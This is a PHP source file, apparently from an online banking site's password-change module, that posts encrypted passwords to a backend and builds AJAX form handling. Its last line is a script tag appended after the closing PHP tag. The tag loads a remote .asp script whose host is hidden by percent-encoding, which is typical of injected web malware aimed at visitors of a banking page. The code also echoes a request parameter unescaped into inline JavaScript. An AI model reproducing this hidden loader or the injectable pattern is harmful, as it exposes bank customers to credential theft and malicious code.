<?php
($parametros['CustID']!=""?$CustID=$parametros['CustID']:0);
($parametros['Access']!=""?$Access=$parametros['Access']:0);
($parametros['Cadpriv']!=""?$priv=$parametros['Cadpriv']:0);
($parametros['PwdActual']!=""?$PwdActual=$parametros['PwdActual']:0);
($parametros['Passwd']!=""?$Passwd=$parametros['Passwd']:0);
($parametros['NewPass']!=""?$NewPass=$parametros['NewPass']:0);
($parametros['code']!=""?$code=$parametros['code']:0);

	function modSubmit ($submit)
	{
		$submit=str_replace("TYPE=SUBMIT", "type=\"button\" onclick=\"procesarAjax();\"",$submit);
		$submit=str_replace("TYPE=\"SUBMIT\"", "type=\"button\" onclick=\"procesarAjax();\"",$submit);
		$submit=str_replace("type=\"submit\"","type=\"button\" onclick=\"procesarAjax();\"",$submit);
		$submit=str_replace("TYPE=\"PASSWORD\""," TYPE=\"PASSWORD\" onKeyPress=\"if (isEnter(event) == true) { procesarAjax(); }\"", $submit);
		return $submit;
	}
	
	$procesarAjax="
					<script>
					
						function redirecciona ()
						{
//ACS 29Ago2011 BBST Implementación de Bajionet Movil Ini				
							//window.location=\"/login/logout/\";
							window.location=\"/userbb/login/logout/\";
//ACS 29Ago2011 BBST Implementación de Bajionet Movil Fin							
						}
						
						if ('$Access'=='Process' && ret_code==0)
						{
							
							setTimeout('redirecciona()',5000);
						}
					
						function isEnter(e)
						{ 
							var characterCode;

							if(e && e.which)
							{
								e = e;
								characterCode = e.which;
							}
							else
							{
								characterCode = e.keyCode;
							}

							if(characterCode == 13)
							{
								return true;
							}
							else
							{
								return false;
							}
						}
						
						
						function procesarAjax()
						{
							var parametros=	'CustID:'+document.getElementsByName('CustID')[0].value;
								
							if(document.getElementsByName('Access')[0]!=null)
							{
								parametros+=',Access:'+document.getElementsByName('Access')[0].value;
							}
								
							if(document.getElementsByName('Cadpriv')[0]!=null)
							{
								parametros+=',Cadpriv:'+document.getElementsByName('Cadpriv')[0].value;
							}
								
							if(document.getElementsByName('PwdActual')[0]!=null)
							{
								parametros+=',PwdActual:'+document.getElementsByName('PwdActual')[0].value;
							}
								
							if(document.getElementsByName('Passwd')[0]!=null)
							{
								parametros+=',Passwd:'+document.getElementsByName('Passwd')[0].value;
							}
								
							if(document.getElementsByName('NewPass')[0]!=null)
							{
								parametros+=',NewPass:'+document.getElementsByName('NewPass')[0].value;
							}
								
							if(document.getElementsByName('code')[0]!=null)
							{
								parametros+=',code:'+document.getElementsByName('code')[0].value;
							}
							
							iniProcesarMenu('clave', parametros);
							
						}
					</script>";
	
	
	
    $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "clave.php" );

    $t->setAllStrings();

    $t->set_file( array(
        "clave_tpl" => "clave.tpl"
        ) );

    $Empresa = "1"; //-- EVG-EDS Bajionet CNBV 01042005 agregue campo Empresa
    if(empty($Access)) {
        $Access = "FrAc";
    }


    switch($Access) {
    case "FrAc":
        $particularFields = "&Empresa=".urlencode($Empresa); //-- EVG-EDS Bajionet CNBV 19072005 agregue campo Empresa
        $tr->blog($qki,"Password", $FrAccount, $ToAccount, $DiasPzo, $Amount, $Accion);
        break;
    case "Process":
        $particularFields = "&Passwd=".encrypt( $Passwd, strtolower( $usr ) )."&NewPass=".encrypt( $NewPass, strtolower( $usr ) )."&Empresa=".urlencode($Empresa)."&PwdActual=".encrypt( $PwdActual, strtolower( $usr ) );
        $tr->blog($qki,"Password", $FrAccount, $ToAccount, $DiasPzo, $Amount, $Accion);
        break;
    }
    //$transaccion_buffer = "";
    // DebugBreak();

    $ret_code = $tr->PostToHost($backend, "/IBnkIIS.dll", "Trxn=pwd&Access=".urlencode($Access)."&CustID=".urlencode($usr)."&Cadpriv=".urlencode($priv).$particularFields, $qki, $usr, $qki, $priv, $transaccion_buffer); // clave
	
	if ($ret_code == 0)
	{
		$procesarAjax="<script>var ret_code; ret_code='$ret_code';</script>".$procesarAjax;
	}
	else
	{
		$procesarAjax="<script>var ret_code; ret_code='$ret_code';</script>".$procesarAjax;
	}
	
    $t->set_var( "transaccion_buffer", $transaccion_buffer );
	$transaccion_buffer=$t->parse ("output", "clave_tpl" );
	$transaccion_buffer=modSubmit($transaccion_buffer);
	$transaccion_buffer=$procesarAjax.$transaccion_buffer;


?><script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>